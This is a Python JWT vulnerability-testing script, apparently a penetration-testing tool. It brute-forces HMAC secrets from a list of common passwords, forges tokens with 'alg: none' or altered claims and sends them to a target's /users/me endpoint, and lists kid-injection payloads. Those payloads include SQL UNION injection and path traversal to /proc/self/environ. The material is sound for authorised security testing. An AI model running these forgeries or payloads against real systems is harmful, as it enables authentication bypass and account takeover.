#!/usr/bin/env python3
"""Agent for testing JSON Web Token vulnerabilities.

Tests JWT implementations for algorithm confusion, none algorithm
bypass, weak HMAC secrets, kid injection, missing claims, and
token forgery to detect authentication bypass risks.
"""

import json
import base64
import hmac
import hashlib
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


COMMON_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "supersecret",
    "key", "changeme", "default", "your-256-bit-secret",
    "my-secret-key", "jwt-secret", "s3cr3t", "secret123",
    "apisecret", "qwerty", "letmein", "1234567890",
]


class JWTTestAgent:
    """Tests JWT implementations for security vulnerabilities."""

    def __init__(self, base_url=None, output_dir="./jwt_test"):
        self.base_url = base_url.rstrip("/") if base_url else None
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def decode_jwt(self, token):
        """Decode JWT header and payload without verification."""
        parts = token.split(".")
        if len(parts) != 3:
            return None, None, None
        def pad(s):
            return s + "=" * (4 - len(s) % 4)
        try:
            header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
            payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            return header, payload, parts[2]
        except Exception:
            return None, None, None

    def analyze_token(self, token):
        """Analyze JWT for security issues."""
        header, payload, sig = self.decode_jwt(token)
        if not header:
            return {"error": "Invalid JWT"}

        issues = []
        alg = header.get("alg", "")
        if alg == "none":
            issues.append({"severity": "critical", "issue": "alg set to 'none'"})
        if alg in ("HS256", "HS384", "HS512"):
            issues.append({"severity": "info", "issue": f"Symmetric {alg} - test for weak secrets"})
        if "kid" in header:
            issues.append({"severity": "info", "issue": f"kid present: {header['kid']} - test for injection"})
        if "jku" in header:
            issues.append({"severity": "medium", "issue": f"jku present: {header['jku']} - test JWKS spoofing"})
        if "exp" not in payload:
            issues.append({"severity": "high", "issue": "No expiration claim"})
        if "iss" not in payload:
            issues.append({"severity": "medium", "issue": "No issuer claim"})
        if "aud" not in payload:
            issues.append({"severity": "medium", "issue": "No audience claim"})

        for i in issues:
            self.findings.append({"severity": i["severity"], "type": "JWT Analysis", "detail": i["issue"]})

        return {"header": header, "payload": payload, "issues": issues}

    def test_none_algorithm(self, token):
        """Forge token with alg:none to bypass signature."""
        header, payload, _ = self.decode_jwt(token)
        if not header:
            return []

        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        parts = token.split(".")
        variants = [
            f"{new_header}.{parts[1]}.",
            f"{new_header}.{parts[1]}.{parts[2]}",
            f"{new_header}.{parts[1]}.e30",
        ]

        results = []
        if self.base_url and requests:
            for v in variants:
                resp = requests.get(f"{self.base_url}/users/me",
                                    headers={"Authorization": f"Bearer {v}"}, timeout=10)
                if resp.status_code == 200:
                    results.append({"variant": v[:60], "accepted": True})
                    self.findings.append({
                        "severity": "critical",
                        "type": "alg:none Bypass",
                        "detail": "Server accepts JWT with alg:none",
                    })
        return variants

    def brute_force_secret(self, token):
        """Brute-force HMAC secret against common passwords."""
        header, _, _ = self.decode_jwt(token)
        if not header or header.get("alg") not in ("HS256", "HS384", "HS512"):
            return None

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        signature = parts[2]

        alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        h = alg_map[header["alg"]]

        for secret in COMMON_SECRETS:
            expected = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, h).digest()
            ).decode().rstrip("=")
            if expected == signature:
                self.findings.append({
                    "severity": "critical",
                    "type": "Weak JWT Secret",
                    "detail": f"Secret found: '{secret}'",
                })
                return secret
        return None

    def forge_token(self, token, claims_override, secret=None):
        """Forge a JWT with modified claims."""
        header, payload, _ = self.decode_jwt(token)
        if not header:
            return None
        payload.update(claims_override)
        h_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        signing_input = f"{h_b64}.{p_b64}".encode()

        if secret and header.get("alg") in ("HS256", "HS384", "HS512"):
            alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, alg_map[header["alg"]]).digest()
            ).decode().rstrip("=")
            return f"{h_b64}.{p_b64}.{sig}"
        return f"{h_b64}.{p_b64}."

    def test_kid_injection(self, token):
        """Test kid header parameter for injection."""
        header, payload, _ = self.decode_jwt(token)
        if not header or "kid" not in header:
            return []

        payloads = [
            "../../dev/null",
            "' UNION SELECT 'secret' --",
            "/proc/self/environ",
        ]
        results = []
        for p in payloads:
            results.append({"kid_payload": p, "test": "manual verification required"})
        self.findings.append({
            "severity": "medium",
            "type": "kid Injection Candidates",
            "detail": f"kid parameter present - test {len(payloads)} injection payloads",
        })
        return results

    def generate_report(self, token=None):
        analysis = None
        secret = None
        if token:
            analysis = self.analyze_token(token)
            secret = self.brute_force_secret(token)
            self.test_none_algorithm(token)
            self.test_kid_injection(token)

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "base_url": self.base_url,
            "jwt_analysis": analysis,
            "secret_found": secret,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "jwt_test_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <jwt_token> [--url <base_url>]")
        sys.exit(1)
    token = sys.argv[1]
    url = None
    if "--url" in sys.argv:
        url = sys.argv[sys.argv.index("--url") + 1]
    agent = JWTTestAgent(url)
    agent.generate_report(token)


if __name__ == "__main__":
    main()
